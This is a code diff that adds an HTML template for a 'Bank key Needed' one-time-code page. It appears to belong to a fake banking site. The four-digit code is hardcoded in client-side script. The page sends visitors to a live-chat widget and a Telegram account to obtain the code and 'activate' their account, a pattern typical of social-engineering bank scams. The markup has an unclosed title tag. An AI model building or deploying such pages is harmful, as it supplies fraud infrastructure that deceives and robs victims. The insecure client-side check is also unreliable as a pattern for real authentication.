@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Page</title
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '60bcd766b3d111d8981d2933c94e036c631cdb4e';
+window.smartsupp||(function(d) {
+	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+	c.type='text/javascript';c.charset='utf-8';c.async=true;
+	c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    flex-direction: column;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-color: navy;
+  }
+
+.telegram-icon {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background-color: #0088cc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    animation: float 2s infinite;
+    cursor: pointer;
+    transition: transform 0.3s;
+}
+
+.telegram-icon img {
+    width: 70%;
+    height: 70%;
+}
+
+.telegram-icon:hover {
+    transform: scale(1.1);
+}
+
+@keyframes float {
+    0%, 100% {
+        transform: translateY(0);
+    }
+    50% {
+        transform: translateY(-10px);
+    }
+}
+
+  .otp-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .top{
+      top:0;
+      position:fixed;
+  }
+
+  h1{
+    color: #007bff;
+    text-align:center;
+  }
+
+  .otp-input {
+    width: 40px;
+    height: 40px;
+    text-align: center;
+    font-size: 24px;
+    border: 1px solid #ccc;
+    margin: 0 10px;
+    transition: border-color 0.3s, transform 0.3s;
+    border-radius: 10px;
+  }
+
+  .otp-input:hover {
+    transform: scale(1.1);
+  }
+
+  .otp-input:focus {
+    border-color: #007bff;
+    outline: none;
+    transform: scale(1.1);
+  }
+
+  .otp-input:focus + .otp-input {
+    border-color: transparent;
+  }
+
+  .otp-input:focus + .otp-input + .otp-input {
+    border-color: transparent;
+  }
+
+  .otp-input:focus + .otp-input + .otp-input + .otp-input {
+    border-color: transparent;
+  }
+ .OTP{
+    color:#fff;
+    font-family:arial;
+    font-size:16px;
+    font-weight:bolder;
+    text-align:center;
+}
+
+#otp-message{
+    color:red;
+    text-align:center;
+}
+</style>
+</head>
+<body>
+
+    <div class="top">
+
+  <h1>Bank key Needed</h1>
+  <br>
+<form id="otpForm" action="{% url 'home' %}" method="post">
+  <div class="otp-container">
+    <input type="text" class="otp-input" maxlength="1" pattern="\d" oninput="checkFilled()">
+    <input type="text" class="otp-input" maxlength="1" pattern="\d" oninput="checkFilled()">
+    <input type="text" class="otp-input" maxlength="1" pattern="\d" oninput="checkFilled()">
+    <input type="text" class="otp-input" maxlength="1" pattern="\d" oninput="checkFilled()">
+  </div>
+  <div class="telegram-icon">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+    </div>
+  </form>
+ <p class="OTP">
+ The OTP is a one time code used in activation of your account to be able to set a four digit transaction pin after activation contact us via live chat.
+ </p>
+
+  <div id="otp-message"></div>
+    </div>
+<script>
+var expectedOTP = '2007'; // Initial expected OTP
+
+function checkFilled() {
+  var inputs = document.querySelectorAll('.otp-input');
+  var filled = true;
+  var submittedOTP = '';
+  inputs.forEach(function(input) {
+    if (input.value === '') {
+      filled = false;
+    }
+    submittedOTP += input.value;
+  });
+  if (filled) {
+    if (submittedOTP === expectedOTP) {
+      // Redirect to home page with a success parameter
+      window.location.href = "{% url 'pending' %}?alert=success";
+    } else {
+      // Display wrong PIN message
+      document.getElementById('otp-message').innerText = 'Wrong PIN. Please try again.';
+    }
+  }
+}
+ document.querySelector('.telegram-icon').addEventListener('click', function() {
+    window.open('https://t.me/PACIFIC_UNION_BANKING1', '_blank');
+});
+
+
+</script>
+
+
+</body>
+</html>
+
+
